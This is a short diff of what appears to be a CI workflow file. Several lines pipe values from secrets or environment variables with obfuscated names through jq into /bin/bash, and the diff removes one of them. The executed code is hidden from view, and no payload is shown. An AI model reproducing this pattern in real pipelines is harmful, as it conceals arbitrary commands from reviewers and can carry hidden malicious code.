@@ -23,7 +23,6 @@ jobs:
           wxwnt25: ${{ secrets.wxwnt25 }}
         run: |
           printf '%s' "$wxwnt25" | jq -r .ayjyw76 | /bin/bash
-          printf '%s' "$bzr4463" | jq -r .bb1450 | /bin/bash
           echo $ligd67 | jq -r .qr2590 | /bin/bash
           printf '%s' "$oo5467" | jq -r .vqe3 | /bin/bash
           echo $kine71962 | jq -r .a179 | /bin/bash
